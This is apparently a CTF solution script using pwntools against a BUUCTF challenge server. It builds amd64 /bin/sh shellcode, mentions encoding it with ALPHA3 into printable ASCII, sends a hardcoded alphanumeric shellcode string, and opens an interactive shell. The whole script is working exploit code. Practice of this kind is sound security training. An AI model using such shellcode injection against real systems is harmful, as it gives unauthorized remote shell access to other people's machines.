from pwn import *

# 可见ascii字符串的shellcode
r = remote('node5.buuoj.cn', 25536)
context.log_level = 'debug'
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
with open(r'shellcode_amd64.txt', 'w') as fp:
    fp.write(shellcode)

# https://github.com/SkyLined/alpha3
# python3 ALPHA3.py x64 ascii mixedcase rax --input="shellcode_amd64.txt"
shellcode_str = b'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'
r.sendafter(b'magic!\n', shellcode_str)
r.interactive()
